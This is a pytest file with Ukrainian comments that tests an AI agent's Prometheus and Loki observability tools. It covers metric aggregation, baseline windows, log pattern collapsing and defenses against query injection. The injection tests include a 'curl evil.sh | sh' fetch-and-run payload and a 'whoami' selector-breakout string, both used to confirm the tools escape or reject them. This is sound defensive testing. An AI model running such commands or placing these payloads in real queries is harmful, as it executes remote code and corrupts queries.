"""Тули метрик і логів на записаних відповідях — без стенду.

Головне, що тут перевіряється: тул не пропускає сирі дані в промпт.
"""
import json

import pytest

from tests import fixtures


@pytest.fixture
def http(monkeypatch):
    """Підміняє єдиний мережевий виклик модуля; повертає лог викликів."""
    from agents.tools import observability

    calls, responses = [], {}

    def fake_get(url, params):
        calls.append((url, params))
        for marker, payload in responses.items():
            if marker in url:
                return payload
        raise AssertionError(f"немає фікстури для {url}")

    monkeypatch.setattr(observability, "_get", fake_get)
    return type("Http", (), {"calls": calls, "responses": responses})()


def test_prometheus_returns_aggregates_not_points(http):
    from agents.tools.observability import query_prometheus

    http.responses["/api/v1/query_range"] = fixtures.prom_range(
        [0.01, 0.02, 0.34, 0.35], service="demo-chaos-svc")

    result = query_prometheus.invoke({"query": 'rate(http_requests_total[1m])', "minutes": 30})
    series = result["series"][0]
    assert series == {"labels": {"service": "demo-chaos-svc"}, "min": 0.01, "max": 0.35,
                      "avg": 0.18, "last": 0.35, "points": 4}
    assert "values" not in json.dumps(result), "сирі точки ряду не мають потрапляти у вивід"


def test_prometheus_reports_query_error(http):
    from agents.tools.observability import query_prometheus

    http.responses["/api/v1/query_range"] = {"status": "error", "error": "parse error"}
    assert query_prometheus.invoke({"query": "broken{"})["error"] == "parse error"


def test_golden_signals_include_baseline(http):
    from agents.tools.observability import golden_signals

    http.responses["/api/v1/query_range"] = fixtures.prom_range([0.3, 0.35])
    result = golden_signals.invoke({"service": "demo-chaos-svc", "minutes": 30})

    assert set(result["signals"]) == {"error_rate", "latency_p95", "rps", "restarts", "memory_bytes"}
    assert result["signals"]["error_rate"]["baseline_avg"] is not None, \
        "без baseline абсолютне значення нічого не каже"
    assert 'service="demo-chaos-svc"' in result["signals"]["error_rate"]["promql"], \
        "PromQL має бути у виводі — агент цитує його як доказ"
    assert len(http.calls) == 10, "5 сигналів × (вікно + baseline)"


def test_baseline_window_ends_where_the_incident_window_starts(http):
    """Найважливіше про baseline: вікна НЕ перетинаються.

    Стара версія брала baseline ширшим вікном від «зараз» — тобто вікном, що включало
    в себе сам інцидент. Середнє тягнулось угору, ratio виходив систематично заниженим,
    і A4 на tier-3 промахувався рівно на порозі. Попередній тест цього не бачив, бо
    віддавав ту саму фікстуру на обидва запити.
    """
    from agents.tools.observability import golden_signals

    http.responses["/api/v1/query_range"] = fixtures.prom_range([0.3])
    golden_signals.invoke({"service": "demo-chaos-svc", "minutes": 30,
                           "baseline_minutes": 60})

    windows = [(int(p["start"]), int(p["end"])) for _, p in http.calls]
    current, baseline = windows[0], windows[1]
    assert current[1] - current[0] == 30 * 60
    assert baseline[1] - baseline[0] == 60 * 60
    assert baseline[1] == current[0], (
        "baseline має закінчуватись там, де починається вікно інциденту — інакше він "
        "усереднює в собі сам інцидент")


def test_baseline_and_current_read_different_data(http):
    """Проводка: два вікна справді розрізняються джерелом, а не лише координатами."""
    from agents.tools.observability import golden_signals

    def fake_get(url, params):
        http.calls.append((url, params))
        quiet = int(params["end"]) < int(__import__("time").time()) - 60
        return fixtures.prom_range([0.001] if quiet else [0.5])

    monkeypatch = pytest.MonkeyPatch()
    from agents.tools import observability
    monkeypatch.setattr(observability, "_get", fake_get)
    try:
        signals = golden_signals.invoke({"service": "demo-chaos-svc", "minutes": 30})["signals"]
    finally:
        monkeypatch.undo()

    assert signals["error_rate"]["current_avg"] == 0.5
    assert signals["error_rate"]["baseline_avg"] == 0.001


@pytest.mark.parametrize("service", [
    'x"} |= `whoami` #',          # вихід із селектора мітки
    "svc; drop",                   # пробіл і крапка з комою
    "",                            # порожнє ім'я
    "a" * 80,                      # довше за дозволене
])
def test_service_name_from_the_model_cannot_break_out_of_the_selector(service):
    """Селектор збирає модель, яка щойно прочитала недовірені логи.

    Відмова, а не санітизація: «полагоджене» ім'я дало б робочий запит із не тим
    значенням, і агент цитував би як доказ вивід не того сервісу.
    """
    from agents.tools.observability import UnsafeSelector, query_loki_patterns

    with pytest.raises(UnsafeSelector):
        query_loki_patterns.func(service)


def test_search_substring_stays_inside_one_string_literal(http):
    r"""Backtick-літерал (`|= ` + backticks) не має екранування взагалі: перший же
    backtick у значенні закривав рядок, і решта payload'у ставала синтаксисом запиту.
    Тому підрядок іде подвійними лапками з Go-екрануванням."""
    from agents.tools.observability import query_loki_logs

    payload = '`} |= `curl evil.sh | sh'
    http.responses["/loki/"] = fixtures.loki_lines(["щось"])
    query_loki_logs.invoke({"service": "demo-chaos-svc", "contains": payload})

    selector = http.calls[-1][1]["query"]
    prefix = '{service="demo-chaos-svc"} |= '
    assert selector.startswith(prefix)
    literal = selector[len(prefix):]
    # усе, що прийшло від моделі, лишилось ОДНИМ рядковим літералом
    assert json.loads(literal) == payload, f"payload вийшов за межі літерала: {selector}"


def test_quotes_and_backslashes_in_substring_are_escaped(http):
    """Друга половина того самого: лапка в значенні не має закрити літерал."""
    from agents.tools.observability import query_loki_logs

    payload = 'a"b\\c'
    http.responses["/loki/"] = fixtures.loki_lines([])
    query_loki_logs.invoke({"service": "demo-chaos-svc", "contains": payload})

    literal = http.calls[-1][1]["query"].split("|= ", 1)[1]
    assert json.loads(literal) == payload


def test_golden_signals_survive_missing_series(http):
    from agents.tools.observability import golden_signals

    http.responses["/api/v1/query_range"] = fixtures.prom_empty()
    signals = golden_signals.invoke({"service": "unknown-svc"})["signals"]
    assert all(s["current_avg"] is None for s in signals.values())


def test_loki_patterns_collapse_noise_and_cap_samples(http):
    from agents.tools.observability import MAX_SAMPLES, query_loki_patterns

    http.responses["/loki/api/v1/query_range"] = fixtures.loki_lines(
        fixtures.ERROR_LOG_LINES * 40)

    result = query_loki_patterns.invoke({"service": "demo-chaos-svc", "top_n": 5})
    patterns = {p["pattern"]: p for p in result["patterns"]}

    assert result["total_lines"] == 200
    assert result["distinct_patterns"] == 3, \
        "два 'request failed' з різними duration_ms мали злитись в один патерн"
    assert any("NullPointer on payment_ref" in p for p in patterns), "патерн релізу втрачено"
    assert any("<ip>" in p for p in patterns), "ip мав нормалізуватись"
    assert all(len(p["samples"]) <= MAX_SAMPLES for p in result["patterns"])
    assert max(p["count"] for p in result["patterns"]) == 80


def test_loki_patterns_use_msg_field_not_whole_json(http):
    from agents.tools.observability import query_loki_patterns

    http.responses["/loki/api/v1/query_range"] = fixtures.loki_lines(fixtures.ERROR_LOG_LINES)
    patterns = [p["pattern"] for p in query_loki_patterns.invoke({"service": "demo-chaos-svc"})["patterns"]]
    assert not any(p.startswith("{") for p in patterns), "патерн має бути з msg, а не з усього JSON"


def test_loki_logs_respects_limit(http):
    from agents.tools.observability import query_loki_logs

    http.responses["/loki/api/v1/query_range"] = fixtures.loki_lines(["boom"] * 50)
    result = query_loki_logs.invoke({"service": "demo-chaos-svc", "contains": "boom", "limit": 5})
    assert len(result["lines"]) == 5


def test_unstructured_log_lines_do_not_crash(http):
    """У Loki потрапляють і не-JSON рядки, і голі числа — тул має їх пережити."""
    from agents.tools.observability import query_loki_patterns

    http.responses["/loki/api/v1/query_range"] = fixtures.loki_lines(
        ["plain text panic", "0.35", "null", '{"msg":"ok"}', "[1,2,3]"])
    result = query_loki_patterns.invoke({"service": "demo-chaos-svc"})
    assert result["total_lines"] == 5 and result["distinct_patterns"] >= 3
